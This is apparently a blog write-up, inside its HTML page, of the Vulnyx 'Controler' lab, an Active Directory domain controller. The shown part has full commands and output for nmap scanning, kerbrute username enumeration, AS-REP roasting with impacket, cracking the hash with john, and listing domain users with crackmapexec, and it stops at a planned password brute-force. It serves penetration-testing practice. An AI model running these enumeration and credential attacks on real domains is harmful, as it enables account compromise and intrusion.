@@ -1,0 +1,716 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="windows靶机。 靶机IP：192.168.56.117 信息收集 nmap： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnyx-Controler">
+<meta property="og:url" content="http://example.com/2025/06/11/Vulnyx-Controler/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="windows靶机。 靶机IP：192.168.56.117 信息收集 nmap： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2025/06/11/Vulnyx-Controler/msedge_mpQzCnreXM.png">
+<meta property="article:published_time" content="2025-06-11T08:32:33.000Z">
+<meta property="article:modified_time" content="2025-06-11T12:51:48.795Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="Vulnyx">
+<meta property="article:tag" content="域">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2025/06/11/Vulnyx-Controler/msedge_mpQzCnreXM.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Vulnyx-Controler - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Vulnyx-Controler"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-11 16:32" pubdate>
+          June 11, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Vulnyx-Controler</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>windows靶机。</p>
+<p>靶机IP：192.168.56.117</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><hr>
+<p>nmap：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -T4 -A -v 192.168.56.117    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-11 04:32 EDT<br>NSE: Loaded 156 scripts for scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 04:32<br>Completed NSE at 04:32, 0.00s elapsed<br>Initiating NSE at 04:32<br>Completed NSE at 04:32, 0.00s elapsed<br>Initiating NSE at 04:32<br>Completed NSE at 04:32, 0.00s elapsed<br>Initiating ARP Ping Scan at 04:32<br>Scanning 192.168.56.117 [1 port]<br>Completed ARP Ping Scan at 04:32, 0.04s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 04:32<br>Completed Parallel DNS resolution of 1 host. at 04:32, 0.04s elapsed<br>Initiating SYN Stealth Scan at 04:32<br>Scanning 192.168.56.117 [1000 ports]<br>Discovered open port 445/tcp on 192.168.56.117<br>Discovered open port 135/tcp on 192.168.56.117<br>Discovered open port 53/tcp on 192.168.56.117<br>Discovered open port 139/tcp on 192.168.56.117<br>Discovered open port 88/tcp on 192.168.56.117<br>Discovered open port 464/tcp on 192.168.56.117<br>Discovered open port 3269/tcp on 192.168.56.117<br>Discovered open port 3268/tcp on 192.168.56.117<br>Discovered open port 636/tcp on 192.168.56.117<br>Discovered open port 389/tcp on 192.168.56.117<br>Discovered open port 593/tcp on 192.168.56.117<br>Completed SYN Stealth Scan at 04:32, 1.46s elapsed (1000 total ports)<br>Initiating Service scan at 04:32<br>Scanning 11 services on 192.168.56.117<br>Completed Service scan at 04:32, 6.22s elapsed (11 services on 1 host)<br>Initiating OS detection (try #1) against 192.168.56.117<br>NSE: Script scanning 192.168.56.117.<br>Initiating NSE at 04:32<br>Completed NSE at 04:33, 8.34s elapsed<br>Initiating NSE at 04:33<br>Completed NSE at 04:33, 0.09s elapsed<br>Initiating NSE at 04:33<br>Completed NSE at 04:33, 0.00s elapsed<br>Nmap scan report for 192.168.56.117<br>Host is up (0.00053s latency).<br>Not shown: 989 closed tcp ports (reset)<br>PORT     STATE SERVICE       VERSION<br>53/tcp   open  domain        Simple DNS Plus<br>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-11 23:32:51Z)<br>135/tcp  open  msrpc         Microsoft Windows RPC<br>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: control.nyx0., Site: Default-First-Site-Name)<br>445/tcp  open  microsoft-ds?<br>464/tcp  open  kpasswd5?<br>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp  open  tcpwrapped<br>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: control.nyx0., Site: Default-First-Site-Name)<br>3269/tcp open  tcpwrapped<br>MAC Address: 08:00:27:AC:90:5A (Oracle VirtualBox virtual NIC)<br>Device type: general purpose<br>Running: Microsoft Windows 2019<br>OS details: Microsoft Windows Server 2019<br>Network Distance: 1 hop<br>TCP Sequence Prediction: Difficulty=262 (Good luck!)<br>IP ID Sequence Generation: Incremental<br>Service Info: Host: CONTROLER; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-time: <br>|   date: 2025-06-11T23:32:52<br>|_  start_date: N/A<br>| nbstat: NetBIOS name: CONTROLER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:ac:90:5a (Oracle VirtualBox virtual NIC)<br>| Names:<br>|   CONTROLER&lt;00&gt;        Flags: &lt;unique&gt;&lt;active&gt;<br>|   CONTROL&lt;00&gt;          Flags: &lt;group&gt;&lt;active&gt;<br>|   CONTROL&lt;1c&gt;          Flags: &lt;group&gt;&lt;active&gt;<br>|   CONTROLER&lt;20&gt;        Flags: &lt;unique&gt;&lt;active&gt;<br>|_  CONTROL&lt;1b&gt;          Flags: &lt;unique&gt;&lt;active&gt;<br>|_clock-skew: 14h59m57s<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled and required<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.53 ms 192.168.56.117<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 04:33<br>Completed NSE at 04:33, 0.00s elapsed<br>Initiating NSE at 04:33<br>Completed NSE at 04:33, 0.00s elapsed<br>Initiating NSE at 04:33<br>Completed NSE at 04:33, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 17.70 seconds<br>           Raw packets sent: 1148 (51.210KB) | Rcvd: 1017 (41.350KB)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap 192.168.56.117 --script vuln<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-11 04:35 EDT<br>Nmap scan report for 192.168.56.117<br>Host is up (0.00040s latency).<br>Not shown: 989 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>53/tcp   open  domain<br>88/tcp   open  kerberos-sec<br>135/tcp  open  msrpc<br>139/tcp  open  netbios-ssn<br>389/tcp  open  ldap<br>445/tcp  open  microsoft-ds<br>464/tcp  open  kpasswd5<br>593/tcp  open  http-rpc-epmap<br>636/tcp  open  ldapssl<br>3268/tcp open  globalcatLDAP<br>3269/tcp open  globalcatLDAPssl<br>MAC Address: 08:00:27:AC:90:5A (Oracle VirtualBox virtual NIC)<br><br>Host script results:<br>|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR<br>|_smb-vuln-ms10-054: false<br>|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR<br><br>Nmap done: 1 IP address (1 host up) scanned in 41.07 seconds<br></code></pre></td></tr></table></figure>
+
+<p>smb登录看一看有什么东西。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">nxc smb 192.168.56.117                                        <br>SMB         192.168.56.117  445    CONTROLER        [*] Windows 10 / Server 2019 Build 17763 x64 (name:CONTROLER) (domain:control.nyx) (signing:True) (SMBv1:False)<br></code></pre></td></tr></table></figure>
+
+<p>拿到了一个域名，放到hosts里。</p>
+<p>尝试进行用户收集。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs shell">ldapsearch -x -H ldap://192.168.56.117<br><span class="hljs-meta prompt_"># </span><span class="language-bash">extended LDIF</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-comment"># LDAPv3</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">base &lt;&gt; (default) with scope subtree</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">filter: (objectclass=*)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">requesting: ALL</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"></span><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">search result</span><br>search: 2<br>result: 1 Operations error<br>text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera<br> tion a successful bind must be completed on the connection., data 0, v4563<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">numResponses: 1</span><br>                                                                                                                                                           <br>┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# rpcclient -U &quot;&quot; -N 192.168.56.117<br>rpcclient $&gt; netshareenum<br>do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; netshareenumall<br>do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; ^C<br>                                                                                                                                                           <br>┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# enum4linux -A 192.168.56.117<br>Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jun 11 04:50:21 2025<br><br> =========================================( Target Information )=========================================<br>                                                                                                                                                           <br>Target ........... 192.168.56.117                                                                                                                          <br>RID Range ........ 500-550,1000-1050<br>Username ......... &#x27;&#x27;<br>Password ......... &#x27;&#x27;<br>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br><br><br> ===========================( Enumerating Workgroup/Domain on 192.168.56.117 )===========================<br>                                                                                                                                                           <br>                                                                                                                                                           <br>[+] Got domain/workgroup name: CONTROL                                                                                                                     <br>                                                                                                                                                           <br>                                                                                                                                                           <br> ==================================( Session Check on 192.168.56.117 )==================================<br>                                                                                                                                                           <br>                                                                                                                                                           <br>[+] Server 192.168.56.117 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;                                                                                   <br>                                                                                                                                                           <br>                                                                                                                                                           <br> ===============================( Getting domain SID for 192.168.56.117 )===============================<br>                                                                                                                                                           <br>Domain Name: CONTROL                                                                                                                                       <br>Domain Sid: S-1-5-21-2142633474-2248127568-3584646925<br><br>[+] Host is part of a domain (not a workgroup)                                                                                                             <br>                                                                                                                                                           <br>enum4linux complete on Wed Jun 11 04:50:21 2025                <br></code></pre></td></tr></table></figure>
+
+<p>无果，尝试暴力破解。</p>
+<p>（这里用kali自带的用户名字典跑不出来，得换网上专门用于用户枚举的）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">./kerbrute_linux_amd64 userenum -d control.nyx --dc 192.168.56.117 /usr/share/seclists/Usernames/A-Z.Surnames.txt                 <br><br>    __             __               __     <br>   / /_____  _____/ /_  _______  __/ /____ <br>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \<br> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/<br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        <br><br>Version: v1.0.3 (9dad6e1) - 06/11/25 - Ronnie Flathers @ropnop<br><br>2025/06/11 05:05:02 &gt;  Using KDC(s):<br>2025/06/11 05:05:02 &gt;   192.168.56.117:88<br><br>2025/06/11 05:05:02 &gt;  [+] VALID USERNAME:       B.LEWIS@control.nyx<br>2025/06/11 05:05:08 &gt;  Done! Tested 13000 usernames (1 valid) in 6.136 seconds<br><br></code></pre></td></tr></table></figure>
+
+<p>得到一个域用户。</p>
+<h3 id="AS-Roasting"><a href="#AS-Roasting" class="headerlink" title="AS-Roasting"></a>AS-Roasting</h3><hr>
+<p>查看该域用户是否无域认证，尝试抓取hash。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">impacket-GetNPUsers control.nyx/B.LEWIS -no-pass <br>/usr/lib/python3/dist-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.<br>  import pkg_resources<br>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies <br><br>[*] Getting TGT for B.LEWIS<br>/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).<br>  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)<br><span class="hljs-meta prompt_">$</span><span class="language-bash">krb5asrep$23<span class="hljs-variable">$B</span>.LEWIS@CONTROL.NYX:673f87866e1253733a78d827c8f76ac2<span class="hljs-variable">$e746876ee8a2b48932bce457c461397d73700cc3eb7625aa9b93a650718753cae7b6a98a73714ca10b3fd380813a817df0bec981b9ae90a137d7810e0ad49a0c3dcc2681222f14338fa58f47e70dbdad8a8ba4e6c65bb3501beeffa74468e24f7c8fa3958af07d0fc03eff16ed59f10025d3705f7ccf55275777862dd59cde593f49475339b9efcf0cfd62806346d3c1e0a7a3b7fc4e4042de01e89fbd28c672e77735baae50064276a4e4979ad6c98dc03c8691d191b34e7c2cf28f26af322cf57aa3ba88fb643f8d937d582dfadac9928a5354cc4db8d1c2c81d28b4e4874628b6e46858feef80849b</span></span><br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">john --format=krb5asrep --wordlist=rockyou.txt hash.txt<br>Using default input encoding: UTF-8<br>Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>101Music         ($krb5asrep$23$B.LEWIS@CONTROL.NYX)     <br>1g 0:00:00:09 DONE (2025-06-11 05:15) 0.1006g/s 1353Kp/s 1353Kc/s 1353KC/s 101eagles..1019904<br>Use the &quot;--show&quot; option to display all of the cracked passwords reliably<br>Session completed. <br><br></code></pre></td></tr></table></figure>
+
+<p>尝试用winrm拿到shell，无果。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"> nxc winrm <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span> -u <span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.lewis</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">101</span>Music<br>WINRM       <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">5985</span>   CONTROLER        <span class="hljs-selector-attr">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (name:CONTROLER) (domain:control.nyx) <br>WINRM       <span class="hljs-number">192.168</span>.<span class="hljs-number">56.117</span>  <span class="hljs-number">5985</span>   CONTROLER        <span class="hljs-selector-attr">[-]</span> control.nyx\<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.lewis</span>:<span class="hljs-number">101</span>Music<br></code></pre></td></tr></table></figure>
+
+<p>smb登上去查看域内用户。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">crackmapexec smb 192.168.56.117 -u B.LEWIS -p &#x27;101Music&#x27; --users<br>SMB         192.168.56.117  445    CONTROLER        [*] Windows 10 / Server 2019 Build 17763 x64 (name:CONTROLER) (domain:control.nyx) (signing:True) (SMBv1:False)<br>SMB         192.168.56.117  445    CONTROLER        [+] control.nyx\B.LEWIS:101Music <br>SMB         192.168.56.117  445    CONTROLER        [+] Enumerated domain user(s)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\a.hansen                       badpwdcount: 1 desc: (Account Disabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\d.petrov                       badpwdcount: 1 desc: (Account Disabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\m.klein                        badpwdcount: 1 desc: (Account Disabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\b.lewis                        badpwdcount: 0 desc: (Account Enabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\j.levy                         badpwdcount: 0 desc: (Account Enabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\Guest                          badpwdcount: 0 desc: (Account Disabled)<br>SMB         192.168.56.117  445    CONTROLER        control.nyx\Administrator                  badpwdcount: 0 desc: (Account Enabled)<br><br></code></pre></td></tr></table></figure>
+
+<p>发现J.Levy用户同样可用。</p>
+<p>爆破密码。</p>
